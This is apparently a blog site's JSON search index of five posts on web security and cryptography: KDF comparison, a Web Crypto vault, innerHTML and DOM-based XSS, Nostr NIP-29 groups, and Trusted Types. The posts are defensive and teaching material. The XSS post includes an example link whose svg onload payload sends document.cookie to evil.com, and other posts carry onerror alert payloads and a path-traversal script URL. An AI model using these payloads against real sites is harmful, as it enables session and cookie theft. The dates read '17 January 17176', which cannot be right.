[{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/innerhtml/","section":"Tags","summary":"","title":"`InnerHTML`","type":"tags"},{"content":" Analysis of Entropy Loss and Computational Security: PBKDF2 vs. Argon2id in WASM Environments # PBKDF2 and Argon2id # PBKDF2 has been a standard for decades, utilizing a repeated hashing mechanism (usually HMAC with SHA-256) to slow down brute-force attacks. However, as hardware evolved—specifically with the rise of ASICs (Application-Specific Integrated Circuits) and GPUs—PBKDF2\u0026rsquo;s lack of memory-hard properties became a liability.\nIn contrast, Argon2 won the Password Hashing Competition in 2015. Its \u0026ldquo;id\u0026rdquo; variant is a hybrid approach specifically designed to resist both side-channel attacks and GPU-based cracking. With the advent of WebAssembly (WASM), developers can now run Argon2id directly in the browser with near-native performance, challenging the traditional dominance of the browser’s built-in PBKDF2 implementations.\nOverview of Entropy and Its Importance # Entropy, in cryptography, refers to the measure of uncertainty or randomness in a data set. A password like \u0026ldquo;password123\u0026rdquo; has extremely low entropy, making it predictable. The goal of a KDF is to take this low-entropy input and produce a \u0026ldquo;stretched\u0026rdquo; key that appears entirely random.\n\u0026ldquo;Entropy loss\u0026rdquo; in this context does not typically refer to the reduction of the theoretical maximum randomness, but rather the relative security degradation when an algorithm is susceptible to specialized hardware. If an attacker can test billions of keys per second due to an algorithm\u0026rsquo;s structural simplicity, the \u0026ldquo;effective entropy\u0026rdquo; of the user\u0026rsquo;s password effectively drops.\nAnalysis of Entropy Loss in PBKDF2 Iterations # PBKDF2 operates on a purely computational basis. It applies a pseudorandom function (like SHA-256) over many iterations. While this increases the time required for a single guess, it does not increase the resources (memory) required.\nThe Hardware Gap: The primary \u0026ldquo;entropy loss\u0026rdquo; in PBKDF2 is a result of parallelism. An attacker using a GPU can run thousands of PBKDF2 instances simultaneously because the algorithm requires almost no memory. In a WASM environment, PBKDF2 is often executed via the browser\u0026rsquo;s native SubtleCrypto API. While this is fast, the fundamental math remains the same: PBKDF2 is \u0026ldquo;memory-light,\u0026rdquo; making it an easy target for hardware acceleration that reduces the effective security margin of the password.\nEvaluation of Argon2id Regarding Entropy Loss # Argon2id is a memory-hard function. It is designed to fill a large block of memory with pseudorandom data before producing the final key.\nResistance to Effective Entropy Degradation: By requiring a significant amount of RAM (e.g., 64MB or 128MB) for a single derivation, Argon2id prevents attackers from using massive parallelism. A GPU might have thousands of cores, but it has limited memory per core. This forces the attacker to use much more expensive hardware (like specialized servers) to attempt a brute-force attack, thereby preserving the \u0026ldquo;effective entropy\u0026rdquo; of the password more successfully than PBKDF2.\nComparison in WASM Contexts # The introduction of WebAssembly (WASM) has fundamentally changed the landscape for browser-based security.\nPerformance: Traditionally, Argon2 was too slow for JavaScript. However, WASM allows Argon2id to run at roughly 80% of native speed. This makes it feasible to use 1-second derivation times in the browser, providing a massive security boost over standard JS. Availability: PBKDF2 is natively supported by the Web Crypto API (window.crypto.subtle), meaning it requires no extra libraries and is extremely efficient in terms of battery and CPU. Security Trade-offs: PBKDF2 in WASM/Web Crypto is safer against \u0026ldquo;side-channel attacks\u0026rdquo; (where an attacker guesses a key by measuring CPU timing), but Argon2id is vastly superior against \u0026ldquo;off-line attacks\u0026rdquo; (where an attacker steals a hashed password and tries to crack it on their own hardware). Feature PBKDF2 (Web Crypto) Argon2id (WASM) Primary Protection CPU Time (Iterations) CPU Time + RAM (Memory-Hard) GPU Resistance Low High WASM Overhead None (Native API) Moderate (Library load) Side-Channel Safety High High (in \u0026lsquo;id\u0026rsquo; variant) Consider # The analysis of entropy loss reveals that while both algorithms technically preserve the mathematical entropy of the input, Argon2id provides a significantly higher \u0026ldquo;work factor\u0026rdquo; security margin in modern environments.\nFor browser-based applications, PBKDF2 remains a viable option for low-risk scenarios due to its native integration. However, for applications requiring \u0026ldquo;Sovereign-grade\u0026rdquo; security—such as cryptocurrency wallets, end-to-end encrypted messaging, or private vaults—Argon2id via WASM is the superior choice. It effectively mitigates the advantages of specialized attack hardware, ensuring that the user’s password entropy is translated into a key that is as resistant to modern cracking techniques as possible.\nThe practical recommendation for modern developers is to transition to Argon2id for sensitive key derivation, leveraging WASM to bridge the performance gap between web and native platforms.\n","date":"17 January 17176","externalUrl":null,"permalink":"/posts/post-lite-one/","section":"Posts","summary":"In the realm of modern cryptography, Password-Based Key Derivation Functions (KDFs) are essential for transforming human-readable passwords into high-entropy cryptographic keys. Two of the most prominent functions in use today are PBKDF2 (Password-Based Key Derivation Function 2) and Argon2id.","title":"Analysis of Entropy Loss and Computational Security: PBKDF2 vs. Argon2id in WASM Environments","type":"posts"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/argon2id/","section":"Tags","summary":"","title":"Argon2id","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/csp/","section":"Tags","summary":"","title":"CSP","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/dev-teams/","section":"Tags","summary":"","title":"Dev-Teams","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/dom-based-xss/","section":"Tags","summary":"","title":"DOM-Based-XSS","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/groups/","section":"Tags","summary":"","title":"Groups","type":"tags"},{"content":" 1. Basic Premise # In an era where data breaches are not a matter of \u0026ldquo;if\u0026rdquo; but \u0026ldquo;when,\u0026rdquo; the responsibility of protecting user data has shifted from the server to the client. Traditional security models rely on the server being a trusted entity that handles sensitive information in plaintext or decrypts it for processing. However, the \u0026ldquo;Zero-Knowledge\u0026rdquo; (ZK) architecture challenges this paradigm by ensuring that the service provider has exactly zero knowledge of the user\u0026rsquo;s sensitive data. In a ZK vault, data is encrypted on the user’s device before it ever touches a network cable, and the decryption keys never leave the client-side environment.\nHistorically, implementing robust cryptography in the browser required heavy external libraries like CryptoJS or Forge. While these libraries are powerful, they increase the \u0026ldquo;attack surface\u0026rdquo; of an application by introducing third-party code that must be audited and updated. Modern browsers now offer a native solution: the Web Crypto API. This low-level interface provides high-performance, cryptographically sound primitives directly in the browser, allowing developers to build \u0026ldquo;Host-Proof\u0026rdquo; applications with zero external dependencies. This guide explores how to leverage this API to build a secure, private vault from scratch.\n2. Overview of the Web Crypto API # The Web Crypto API is an interface allowing scripts to use cryptographic primitives to build secure systems. It is accessible via window.crypto, which provides two main properties:\ncrypto.getRandomValues(): For generating cryptographically strong pseudo-random numbers. crypto.subtle: The core of the API, providing asynchronous methods for hashing, key generation, encryption, and decryption. The \u0026ldquo;Subtle\u0026rdquo; in SubtleCrypto serves as a warning: cryptographic operations are easy to get wrong. Unlike high-level libraries that might make safety decisions for you, the Web Crypto API requires you to specify every parameter—from the algorithm and key length to the initialization vector (IV).\nOne of the primary advantages of using native Web Crypto is performance. Because it is implemented by the browser engine (often in C++), it can perform heavy computations, like PBKDF2 iterations, much faster than a JavaScript-based library. Furthermore, it operates in a \u0026ldquo;secure context\u0026rdquo; (HTTPS), ensuring that sensitive operations are protected from man-in-the-middle attacks.\n3. Key Concepts of Zero-Knowledge Vaults # Before diving into code, we must define what \u0026ldquo;Zero-Knowledge\u0026rdquo; means in the context of a web vault. In this architecture, the server acts as a \u0026ldquo;blind\u0026rdquo; storage locker. It stores encrypted blobs of data (ciphertext) but lacks the keys to open them.\nThe security of such a system hinges on three pillars:\nDeterministic Key Derivation: Since the server doesn\u0026rsquo;t store the key, the user must be able to recreate the exact same key across different devices using their master password. We use PBKDF2 (Password-Based Key Derivation Function 2) for this. Authenticated Encryption: We use AES-GCM (Advanced Encryption Standard - Galois/Counter Mode). Unlike older modes like AES-CBC, GCM provides both confidentiality and integrity, ensuring that if an attacker tampers with the encrypted data, the decryption will fail. Local Storage of Non-Sensitive Metadata: To decrypt data, the client needs the \u0026ldquo;salt\u0026rdquo; used for the password and the \u0026ldquo;IV\u0026rdquo; used for the encryption. These are not secret and are stored on the server alongside the ciphertext. 4. Step-by-Step Implementation of a Zero-Knowledge Vault # Building the vault involves three major phases: transforming the user\u0026rsquo;s password into a key, encrypting the data, and securely handling the output.\nPhase 1: Key Derivation (PBKDF2) # A raw password is a poor encryption key because it lacks entropy. PBKDF2 \u0026ldquo;stretches\u0026rdquo; the password by running it through thousands of rounds of hashing.\n// Step 1: Convert a password string into a CryptoKey material async function getPasswordKey(password) { const enc = new TextEncoder(); return crypto.subtle.importKey( \u0026#34;raw\u0026#34;, enc.encode(password), \u0026#34;PBKDF2\u0026#34;, false, [\u0026#34;deriveKey\u0026#34;] ); } // Step 2: Derive a secret AES-GCM key from the password key and a salt async function deriveKey(passwordKey, salt) { return crypto.subtle.deriveKey( { name: \u0026#34;PBKDF2\u0026#34;, salt: salt, iterations: 600000, // Industry standard for 2026 hash: \u0026#34;SHA-256\u0026#34;, }, passwordKey, { name: \u0026#34;AES-GCM\u0026#34;, length: 256 }, false, // Key is non-extractable for security [\u0026#34;encrypt\u0026#34;, \u0026#34;decrypt\u0026#34;] ); } Phase 2: Encryption (AES-GCM) # Once we have the derived key, we can encrypt the data. Every encryption operation must use a unique Initialization Vector (IV) to ensure that the same plaintext doesn\u0026rsquo;t result in the same ciphertext.\nasync function encryptData(secretKey, plaintext) { const enc = new TextEncoder(); const iv = crypto.getRandomValues(new Uint8Array(12)); // GCM standard IV length const encodedData = enc.encode(plaintext); const ciphertext = await crypto.subtle.encrypt( { name: \u0026#34;AES-GCM\u0026#34;, iv: iv, }, secretKey, encodedData ); return { ciphertext, iv }; } Phase 3: Decryption # To decrypt, we retrieve the ciphertext, iv, and salt from the server. We recreate the key using the salt and then use the IV to unlock the data.\nasync function decryptData(secretKey, ciphertext, iv) { try { const decrypted = await crypto.subtle.decrypt( { name: \u0026#34;AES-GCM\u0026#34;, iv: iv, }, secretKey, ciphertext ); return new TextDecoder().decode(decrypted); } catch (e) { throw new Error(\u0026#34;Decryption failed. Wrong password or corrupted data.\u0026#34;); } } 5. Security Considerations # While the Web Crypto API is powerful, it is not a \u0026ldquo;silver bullet.\u0026rdquo; Developers must be mindful of several critical factors:\nMemory Management: JavaScript is a garbage-collected language. Even if you \u0026ldquo;delete\u0026rdquo; a password variable, it may remain in memory until the browser clears it. For ultra-secure vaults, sensitive data should be stored in TypedArrays and cleared manually by overwriting them with zeros (Uint8Array.fill(0)). The Iteration Count: PBKDF2 iterations are meant to slow down attackers. In 2026, 600,000 iterations is the baseline. Lower counts make the vault susceptible to GPU-based brute-force attacks. Non-Extractable Keys: In the deriveKey method, the extractable parameter should be set to false. This prevents malicious scripts or XSS attacks from calling exportKey() and stealing the derived key. Salt Management: Never reuse a salt. Each user should have a unique, random salt generated by crypto.getRandomValues(). Reusing salts allows attackers to use \u0026ldquo;Rainbow Tables\u0026rdquo; to crack passwords more efficiently. 6. Consider # Building a zero-knowledge vault using the native Web Crypto API allows developers to create highly secure, private applications without the bloat and risk associated with external libraries. By performing all cryptographic operations on the client and treating the server as a blind storage provider, we significantly reduce the impact of a potential server-side data breach.\nThe Web Crypto API provides the necessary primitives—PBKDF2 for stretching passwords and AES-GCM for authenticated encryption—to build \u0026ldquo;Sovereign-grade\u0026rdquo; infrastructure directly in the browser. As privacy becomes a core feature rather than an afterthought, mastering these native tools is essential for every modern developer.\n","date":"17 January 17176","externalUrl":null,"permalink":"/posts/post-lite-two/","section":"Posts","summary":"In an era where data breaches are not a matter of if but when, the responsibility of protecting user data has shifted from the server to the client.","title":"Guide to the Web Crypto API: Building a Zero-Knowledge Vault Without External Libs","type":"posts"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/liabilities/","section":"Tags","summary":"","title":"Liabilities","type":"tags"},{"content":"However, this bridge is often built using a property that has become one of the most significant security liabilities in the history of web development: innerHTML.\nLet us explore the structural risks of innerHTML, analyzes its role in enabling DOM-based Cross-Site Scripting (XSS), and discusses the modern industry move toward the Sanitizer API as the definitive replacement for unsafe HTML manipulation.\nThe Convenience-Security Trade-off # For nearly two decades, innerHTML has been the \u0026ldquo;Swiss Army Knife\u0026rdquo; for web developers. It allows for the rapid insertion of HTML strings into the DOM, automatically parsing them into functional elements. This simplicity, however, masks a fundamental security flaw: innerHTML treats all strings—including those provided by untrusted users—as executable code.\nAs web applications have transitioned into complex, client-side ecosystems (Single Page Applications), the reliance on innerHTML has grown. Simultaneously, the threat of XSS has remained a top-tier vulnerability. According to the OWASP Foundation (2023), XSS remains among the top ten vulnerabilities affecting web applications, with DOM-based variants becoming increasingly difficult to detect because the malicious payload often never reaches the server, living entirely in the user’s browser.\n2. The Mechanics of innerHTML as a Security Liability # To understand why innerHTML is dangerous, one must understand the browser\u0026rsquo;s \u0026ldquo;sink\u0026rdquo; mechanism. A sink is a function or property that can execute or render data. innerHTML is a prime example of an execution sink.\nWhen a developer assigns a string to innerHTML, the browser’s parser is invoked. If that string contains a script tag or an event handler (like onload or onerror), the browser will execute it.\nThe \u0026ldquo;Event Handler\u0026rdquo; Vector # A common misconception is that simply removing \u0026lt;script\u0026gt; tags makes innerHTML safe. Attackers, however, frequently use alternative attributes to trigger execution. For example:\n// VULNERABLE CODE const userComment = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(\\\u0026#34;XSS Successful\\\u0026#34;)\u0026#39;\u0026gt;\u0026#34;; document.getElementById(\u0026#39;comment-box\u0026#39;).innerHTML = userComment; In this scenario, the browser attempts to load an image from the invalid source \u0026ldquo;x.\u0026rdquo; When the load fails, the onerror event triggers the JavaScript payload. Because innerHTML parses the string as active HTML, it effectively hands the attacker the keys to the user\u0026rsquo;s session.\n3. Case Study: DOM-Based XSS via URL Fragments # Unlike traditional \u0026ldquo;Reflected XSS,\u0026rdquo; where the server echoes a malicious script back to the user, DOM-based XSS happens purely on the client side.\nThe Scenario: A Personalized Dashboard # Consider a dashboard that greets a user by taking their name from the URL. A developer might write the following:\n// URL: https://example.com/dashboard#user=John const params = new URLSearchParams(window.location.hash.substring(1)); const username = params.get(\u0026#39;user\u0026#39;); document.getElementById(\u0026#39;greeting\u0026#39;).innerHTML = `Welcome, \u0026lt;b\u0026gt;${username}\u0026lt;/b\u0026gt;`; The Attack # An attacker crafts a link: https://example.com/dashboard#user=\u0026lt;svg/onload=fetch('//evil.com/steal?data='+document.cookie)\u0026gt;.\nWhen a victim clicks this link:\nThe browser loads the page. The script extracts the payload from the # (fragment) part of the URL. The payload is injected via innerHTML. The \u0026lt;svg\u0026gt; element is parsed, and its onload event fires immediately, sending the user\u0026rsquo;s sensitive cookies to the attacker’s server. Critical Note: Because the payload is in the URL fragment (after the #), it is never even sent to the web server. This makes the attack invisible to traditional Web Application Firewalls (WAFs) and server-side logs, illustrating why client-side security is the last line of defense.\n4. Transitioning to the Sanitizer API # For years, the only way to safely use HTML strings was through heavy third-party libraries like DOMPurify. However, as of late 2023 and leading into 2026, the browser ecosystem has moved toward a native, built-in solution: the Sanitizer API.\nThe Sanitizer API is designed to be \u0026ldquo;secure by default.\u0026rdquo; Instead of developers manually stripping out \u0026ldquo;bad\u0026rdquo; tags, the API provides a platform-level mechanism to clean HTML before it touches the DOM.\nHow it Functions # The Sanitizer API works by taking a string and returning a \u0026ldquo;safe\u0026rdquo; DocumentFragment or string, with all dangerous elements (scripts, event handlers, etc.) removed based on a standardized configuration.\n// SECURE IMPLEMENTATION WITH SANITIZER API const sanitizer = new Sanitizer(); const untrustedHTML = \u0026#34;\u0026lt;img src=x onerror=alert(1)\u0026gt; Safe Text\u0026#34;; // The API strips the \u0026#39;onerror\u0026#39; but keeps the \u0026#39;img\u0026#39; and text const safeFragment = sanitizer.sanitizeFor(\u0026#34;div\u0026#34;, untrustedHTML); document.getElementById(\u0026#39;content\u0026#39;).replaceChildren(safeFragment); Advantages Over innerHTML # Platform Integration: Being native to the browser, it is faster than JavaScript libraries and stays updated with new HTML security threats without requiring developer intervention. Reduced Logic Errors: It prevents common mistakes where developers \u0026ldquo;over-filter\u0026rdquo; (breaking the UI) or \u0026ldquo;under-filter\u0026rdquo; (leaving holes). Namespace Aware: It understands the context of the DOM, making it more robust against complex nesting exploits. 5. Best Practices and Recommendations # The adoption of the Sanitizer API is the future, but security is a layered discipline. Developers should follow these core principles:\nPrefer textContent for Plain Text: If you are only displaying a username or a comment that doesn\u0026rsquo;t need formatting, use element.textContent. It treats all input as literal text, making XSS mathematically impossible. Use element.replaceChildren(): Instead of innerHTML = \u0026quot;\u0026quot;, use replaceChildren() with safe fragments to manage DOM updates. Implement Content Security Policy (CSP): A strong CSP can act as a safety net, blocking inline scripts and unauthorized network requests even if an XSS injection occurs. Avoid the \u0026ldquo;Sinks\u0026rdquo;: Treat innerHTML, outerHTML, and document.write as deprecated in any context involving dynamic data. 6. A New Era of Web Safety # The vulnerability of innerHTML is a structural relic from an era when the web was static. In the interactive landscape of 2026, continuing to use it for dynamic data is a liability that no professional application can afford.\nWhile the Sanitizer API provides a powerful native solution to the problem of HTML injection, the ultimate solution lies in a \u0026ldquo;Secure by Default\u0026rdquo; mindset. By moving away from unsafe sinks and embracing native browser protections, we can effectively close the door on DOM-based XSS and build a web where user data is protected by the very platform that serves it.\nHere is a relavant talk\n","date":"17 January 17176","externalUrl":null,"permalink":"/posts/post-lite-three/","section":"Posts","summary":"In the architecture of a modern web application, the Document Object Model (DOM) is the bridge between static code and dynamic user interaction.","title":"Modern industry move toward the Sanitizer API as the definitive replacement for unsafe HTML manipulation.","type":"posts"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/","section":"Nautilus","summary":"","title":"Nautilus","type":"page"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/nip-29/","section":"Tags","summary":"","title":"NIP-29","type":"tags"},{"content":" 1. The Shift Toward Sovereign Communication # While these tools transformed professional collaboration, they introduced a \u0026ldquo;Middleman Tax\u0026rdquo; in the form of data silos, platform lock-in, and central points of failure. Enter Nostr (Notes and Other Stuff Transmitted by Relays), a minimalist, censorship-resistant protocol that has evolved far beyond simple social microblogging.\nThe catalyst for this evolution is NIP-29 (Nostr Implementation Possibility 29), a protocol standard that defines Relay-managed Groups. By providing a standardized way to handle permissions, moderation, and group identity, NIP-29 allows development teams to treat communication as a decentralized utility—Nostr-as-a-Service—rather than a rented product.\n2. Centralized vs. Decentralized Communication: A Structural Comparison # To understand the necessity of NIP-29, we must analyze the architectural trade-offs between current industry leaders and the decentralized alternative.\nFeature Centralized (Slack/Discord) Decentralized (NIP-29) Data Ownership Owned by the platform provider. Owned by the user (cryptographic keys). Identity Tied to email/phone and provider database. Tied to a Public Key (npub); portable across apps. Persistence Subject to subscription tiers and provider uptime. Persistent across any relay that stores your events. Cost Model Monthly per-user \u0026ldquo;SaaS\u0026rdquo; fees. Pay-per-relay or self-hosted infrastructure cost. Security Trust-based (Provider sees all data). Cryptographic (E2EE and verifiable signatures). In a centralized model, a dev team’s history—the \u0026ldquo;organizational memory\u0026rdquo;—is held hostage by a corporation. If Slack changes its pricing or Discord bans a server, that history is lost. NIP-29 flips this, making the relay a commodity service while the data remains under the team’s cryptographic control.\n3. The Mechanics of NIP-29: How it Works # NIP-29 introduces a standardized way for relays to manage \u0026ldquo;closed\u0026rdquo; groups. Unlike standard Nostr, which is often an open firehose, NIP-29 groups are defined by the relay they reside on, identified by a \u0026lt;host\u0026gt;'\u0026lt;group-id\u0026gt; string (e.g., relay.devteam.com'alpha-project).\nKey technical components include:\nRelay-Managed Moderation: Relays act as the \u0026ldquo;gatekeepers,\u0026rdquo; enforcing who can join and write to a group based on specific rules. Addressable Events: Group metadata and admin lists are stored as addressable events (kinds 39000-39002), signed directly by the relay. Timeline References: To prevent \u0026ldquo;context-jacking\u0026rdquo; (broadcasting messages to other relays out of context), NIP-29 events include references to the previous events seen on that specific relay. 4. Advantages for Development Teams # For dev teams, the transition to a NIP-29 environment offers more than just privacy—it offers workflow sovereignty.\nAccount Portability: A developer joins a team using their npub. If the team moves from Relay A to Relay B, the developer doesn\u0026rsquo;t need to \u0026ldquo;create a new account.\u0026rdquo; Their identity, reputation, and keypair remain the same. Deep Integration with Bitcoin/Lightning: Since Nostr is natively compatible with the Lightning Network (via Zaps), NIP-29 groups can include built-in bounty systems. A developer can \u0026ldquo;Zap\u0026rdquo; a peer for a successful code review or a bug fix directly within the chat interface. Censorship and Shutdown Resistance: If a central provider deems a project \u0026ldquo;controversial\u0026rdquo; (e.g., privacy-focused software), they can be de-platformed. A NIP-29 group can simply be forked or moved to a self-hosted relay. Native Automation: Because Nostr events are simple JSON blobs, it is trivial to build \u0026ldquo;Bots\u0026rdquo; as Nostr clients that pipe GitHub PR notifications or CI/CD logs directly into NIP-29 channels without needing complex OAuth integrations. 5. Challenges and Implementation Hurdles # Despite the benefits, replacing a polished tool like Slack is not without friction.\nNotification Complexity: Centralized apps use proprietary push notification servers (Apple/Google). In a decentralized world, clients must either stay awake to poll relays or use a decentralized notification bridge, which can impact mobile battery life. Discovery vs. Privacy: Balancing the ability for new hires to find groups while maintaining strict \u0026ldquo;Private Group\u0026rdquo; security requires robust relay-side encryption and access control. UI/UX Maturity: In early 2026, many Nostr clients still lack the \u0026ldquo;quality of life\u0026rdquo; features—like threaded replies, complex emoji reactions, and screen-sharing—that teams have come to expect from Discord. Relay Trust: While you own your keys, you still rely on the relay to serve the data. If a relay goes offline, you need to have a \u0026ldquo;Backup Relay\u0026rdquo; strategy to ensure no downtime in communication. 6. Use Case: The Sovereign Open Source Project # Imagine an open-source project with contributors worldwide. Instead of a Discord server, they use a NIP-29 group hosted on their own infrastructure.\nHiring: A new contributor is added to the \u0026ldquo;Admin\u0026rdquo; role via a Kind 9003 event. Work: Discussions occur in NIP-29. Incentives: The project lead sets up a \u0026ldquo;Bounty Bot\u0026rdquo; that monitors NIP-29 for specific tags. When a task is completed, a Lightning payment is triggered to the contributor\u0026rsquo;s npub. Audit: The entire chat history is archived locally by every participant, ensuring that even if the server is seized, the project’s institutional knowledge survives. 7. The Future of Team Communication # The adoption of NIP-29 represents a maturation of the decentralized web. By treating group communication as a set of cryptographic events rather than a proprietary service, development teams can reclaim their digital sovereignty. While hurdles in UX and notification infrastructure remain, the trend is clear: the future of high-stakes development is local-first, encrypted-by-default, and platform-independent.\nSummary of Key Takeaways:\nNIP-29 provides the moderation and group management missing from early Nostr. Decentralization eliminates platform lock-in and protects organizational history. Identity Portability via npubs streamlines onboarding across different project relays. Lightning Integration allows for seamless value-transfer and developer incentives. ","date":"17 January 17176","externalUrl":null,"permalink":"/posts/post-lite-five/","section":"Posts","summary":"In the landscape of 2026, the dominance of centralized communication platforms like Slack and Discord is facing its first structural challenge.","title":"Nostr-as-a-Service: Using NIP-29 (Groups) to Replace Centralized Slack/Discord for Dev Teams","type":"posts"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/pbkdf2/","section":"Tags","summary":"","title":"PBKDF2","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/sanitizer/","section":"Tags","summary":"","title":"Sanitizer","type":"tags"},{"content":"","date":"17 January 17176","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" 1. The Persistent Shadow of DOM-XSS # While \u0026ldquo;Reflected\u0026rdquo; and \u0026ldquo;Stored\u0026rdquo; XSS are well-understood, DOM-based XSS represents a more insidious challenge.\nIn a DOM-based XSS attack, the vulnerability exists entirely in the client-side code. The server may be perfectly secure, but if the JavaScript on the page takes untrusted data (a \u0026ldquo;source,\u0026rdquo; like a URL parameter) and passes it to a dangerous \u0026ldquo;sink\u0026rdquo; (like element.innerHTML), the browser will execute malicious code. Because the payload often never reaches the server, traditional Web Application Firewalls (WAFs) and server-side sanitizers are blind to it.\nTo solve this fundamentally, the security community has moved beyond reactive blacklisting and toward a structural solution: Trusted Types. Trusted Types is a browser-level security primitive that transitions the DOM from an \u0026ldquo;open-by-default\u0026rdquo; system to a \u0026ldquo;locked-down\u0026rdquo; environment where only verified, type-safe objects can reach dangerous sinks.\n2. Overview of Trusted Types and Their Purpose # Trusted Types is a Content Security Policy (CSP) directive that effectively \u0026ldquo;deprecates\u0026rdquo; the use of raw strings in dangerous DOM sinks. In a standard environment, innerHTML accepts any string. With Trusted Types enabled, the browser will throw a type error if you try to pass a string to innerHTML. Instead, you must pass a specialized object: a TrustedHTML, TrustedScript, or TrustedScriptURL.\nBy requiring these objects, Trusted Types forces developers to centralize their security logic. Instead of hoping every developer on a team remembers to sanitize every input, Trusted Types ensures that the only way to update the DOM is through a pre-defined, audited \u0026ldquo;Policy.\u0026rdquo;\n3. Step-by-Step Guide to Setting up Trusted Types # Implementing Trusted Types in a vanilla JavaScript environment involves three distinct phases: Enforcement, Policy Creation, and Implementation.\nPhase 1: Enforcement via CSP # The first step is to tell the browser to stop accepting strings in dangerous sinks. This is done via the Content-Security-Policy HTTP header:\nContent-Security-Policy: require-trusted-types-for \u0026#39;script\u0026#39;; trusted-types my-policy default; require-trusted-types-for 'script': This activates enforcement for all sinks that can execute code. trusted-types my-policy default: This defines a \u0026ldquo;whitelist\u0026rdquo; of policy names that are allowed to create Trusted Types. Phase 2: Detecting the Support # Before creating a policy, you should check if the user\u0026rsquo;s browser supports the API:\nif (window.trustedTypes \u0026amp;\u0026amp; window.trustedTypes.createPolicy) { // Trusted Types is supported } Phase 3: Creating a Policy # A policy is an object that contains a set of \u0026ldquo;rules\u0026rdquo; for transforming a string into a Trusted Type.\nconst myPolicy = trustedTypes.createPolicy(\u0026#39;my-policy\u0026#39;, { createHTML: (input) =\u0026gt; { // Use a library like DOMPurify or a custom logic to clean the string return DOMPurify.sanitize(input); }, createScript: (input) =\u0026gt; { // Logic for validating scripts if necessary return input; }, createScriptURL: (input) =\u0026gt; { // Ensure URLs only point to trusted domains if (input.startsWith(\u0026#39;https://trusted-cdn.com/\u0026#39;)) { return input; } throw new Error(\u0026#39;Untrusted Script URL\u0026#39;); } }); 4. Implementation in Vanilla JS # Once the policy is created, you can no longer do this: elem.innerHTML = \u0026quot;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026quot;; // This will throw a TypeError!\nInstead, you must use your policy:\nconst userContent = fetchUserBio(); // Potential XSS source const secureHTML = myPolicy.createHTML(userContent); elem.innerHTML = secureHTML; // This works! The \u0026ldquo;Default\u0026rdquo; Policy # For legacy applications where changing every instance of innerHTML is impossible, you can define a default policy. The browser will automatically invoke the default policy whenever a string is passed to a sink.\ntrustedTypes.createPolicy(\u0026#39;default\u0026#39;, { createHTML: (input) =\u0026gt; DOMPurify.sanitize(input) }); // This will now work without throwing an error because it // passes through the default policy first: elem.innerHTML = \u0026#34;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026#34;; 5. Practical Examples: Vulnerability vs. Mitigation # To truly appreciate Trusted Types, we must look at how it handles real-world attack vectors.\nExample A: The URL Parameter Sink # Imagine a \u0026ldquo;Search Results\u0026rdquo; page that displays the search term:\n// VULNERABLE const query = new URLSearchParams(window.location.search).get(\u0026#39;q\u0026#39;); document.getElementById(\u0026#39;display\u0026#39;).innerHTML = `Results for: ${query}`; An attacker could send a link: ?q=\u0026lt;img src=x onerror=stealCookies()\u0026gt;. Without Trusted Types, the browser executes stealCookies(). With Trusted Types, the string is rejected because it hasn\u0026rsquo;t been processed by a policy, stopping the attack at the browser\u0026rsquo;s entry point.\nExample B: Dynamic Script Loading # Many SPAs load modules dynamically:\n// VULNERABLE const plugin = new URLSearchParams(window.location.search).get(\u0026#39;plugin\u0026#39;); const script = document.createElement(\u0026#39;script\u0026#39;); script.src = `/plugins/${plugin}.js`; // Attacker could use \u0026#39;../../evil.com/malice\u0026#39; document.head.appendChild(script); Trusted Types enforcement on createScriptURL ensures that the src attribute only accepts a TrustedScriptURL object. If the attacker tries to inject a third-party domain, the policy logic we wrote in Phase 3 would throw an error before the script tag is even added to the DOM.\n6. Transitioning Legacy Codebases # The greatest hurdle to Trusted Types is the \u0026ldquo;broken\u0026rdquo; state of existing code. If you have a massive vanilla JS app, turning on enforcement will likely break your site immediately.\nThe Strategy:\nReporting Mode: Use the Content-Security-Policy-Report-Only header. This allows you to see all the places where your code would have broken without actually breaking it. Audit the Logs: Use the reports to identify which sinks are receiving raw strings. Refactor or Default: Refactor high-risk sinks to use explicit policies and use a default policy for lower-risk areas until they can be addressed. 7. Zero-Trust for the DOM # Trusted Types represents a paradigm shift in web security. It moves the burden of security from the developer\u0026rsquo;s memory to the browser\u0026rsquo;s architecture. In a vanilla JavaScript environment, it provides a \u0026ldquo;Source of Truth\u0026rdquo; for all DOM manipulations, ensuring that no untrusted data can ever transition into executable code.\nBy enforcing require-trusted-types-for, creating audited policies, and utilizing the native API, engineers can effectively eliminate DOM-based XSS from their applications. As privacy and security become the defining features of the modern web, Trusted Types is no longer an optional \u0026ldquo;extra\u0026rdquo;—it is the foundation of sovereign, host-proof infrastructure.\nThis Follow up talk conveys the same idea\n","date":"17 January 17176","externalUrl":null,"permalink":"/posts/post-lite-four/","section":"Posts","summary":"Cross-Site Scripting (XSS) has remained a fixture of the OWASP Top 10 for decades, but as the web has shifted from server-side rendering to complex, client-side logic, the nature of the threat has evolved.","title":"The Fortress of the DOM: Implementing Trusted Types in Vanilla 